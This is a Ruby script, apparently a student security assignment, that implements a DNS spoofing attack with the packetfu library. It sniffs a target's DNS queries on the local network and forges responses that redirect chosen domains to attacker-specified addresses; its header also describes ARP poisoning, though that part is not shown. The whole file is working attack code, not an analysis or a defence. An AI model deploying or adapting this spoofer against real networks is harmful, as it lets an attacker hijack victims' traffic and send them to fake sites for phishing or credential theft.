#################################################################
##
##      Script:    dnsSpoof.rb 
##
##      Functions: dns_query_grabber
##                 getDomainName
##                 isQuery
##                 forgeResponse
##
##      Date:      November 3rd, 2014
##
##      Designer:  Jake Miner
##
##      Programer: Jake Miner
##
##      Notes: This is a simple ARP poisoning and DNS Spoofing
##             application made in Ruby. It reads from spoof.dns
##             To determine the addresses to spoof.
##
#################################################################
#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'resolv'
include PacketFu

#################################################################
##
##      Function:   forgeResponse
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  forgeResponse(src, dst, id, name, myIP, dest)
##                                src   - udp source port
##                                dst   - udp destination port
##                                id    - dns ID 
##                                name  - domain name of the query
##                                myIP  - the IP to send as the response
##                                dest  - the ip destination address
##
##      Returns:    response - the crafted DNS response packet
##
##      Notes:      Creates a DNS packet with the supplied arguments
##
#################################################################
def forgeResponse(src, dst, id, name, myIP, dest)
  response = UDPPacket.new(:config => Utils.whoami?(:iface => $iface))
  response.eth_saddr = $sMac
  response.eth_daddr = $tMac

  response.ip_saddr = dest
  response.ip_daddr = $tIP

  response.udp_src = dst
  response.udp_dst = src 

  response.payload = id
  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
  response.payload += name
  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
  response.payload += myIP

  response.recalc

  return response
end

#################################################################
##
##      Function:   t
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  isQuery(packet)
##                          packet - the DNS packet to check
##
##      Returns:    true if the packet is a dns query, false otherwise
##
##      Notes:      Checks if the packet contains a DNS query
##
#################################################################
def isQuery(packet)
  dnsFlag = (packet.payload[2]).to_s + (packet.payload[3]).to_s
  qryFlag = "\x01\x00"
  if dnsFlag == qryFlag
    return true
  end

  return false
end

#################################################################
##
##      Function:   getDomainName
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  getDomainName(pkt)
##                                pkt - the packet to get the domain from
##
##      Returns:    name - the domain name from the packet
##
##      Notes:      Extracts the domain name from the DNS payload (at byte 12)
##
#################################################################
def getDomainName(pkt)
  name = ""
  
  while true
    num = (pkt[0]).to_s.ord
    if num == 0
      return name = name[0..name.length-1]
    elsif num != 0 
      name += pkt[1, num] + "."
      pkt = pkt[num + 1..-1]
    else
      return nil
    end
  end
end

#################################################################
##
##      Function:   dns_query_grabber
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  dns_query_grabber()
##
##      Returns:    void
##
##      Notes:      Captures dns packets, then forges and 
##                  send the response to the victim
##
#################################################################
def dns_query_grabber()
  file = Hash[*File.read('spoof.dns').split(/[, \n]+/)]
  puts "Waiting for queries:"

  file.each do |key, value|
    temp = file[key].split(".")
    file[key] = [temp[0].to_i, temp[1].to_i, temp[2].to_i, temp[3].to_i].pack('c*')
  end

  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53 and src " + $tIP, :save => true)
  capture_session.stream.each { |packet|
    pkt = Packet.parse(packet)
    if isQuery(pkt)
      

      # get src and dst port from udp
      udpSrc = pkt.udp_src
      udpDst = pkt.udp_dst
      dest = pkt.ip_daddr

      # get transaction id from dns
      queryID = pkt.payload[0, 2]
      
      # get name from packet
      name = getDomainName(pkt.payload[12..-1])
      myIP = file[name[0..-2]]
      
      # check if name should be spoofed
      if file[name[0..-2]] != nil
        resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], myIP, dest)
        resp.to_w($iface)
      else
        safe = Resolv.getaddress name[0..-2]
        safe = safe.split(".")
        tsafe = [safe[0].to_i, safe[1].to_i, safe[2].to_i, safe[3].to_i].pack('c*')
        resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], tsafe, dest)
        resp.to_w($iface)
      end
    end
  }
end
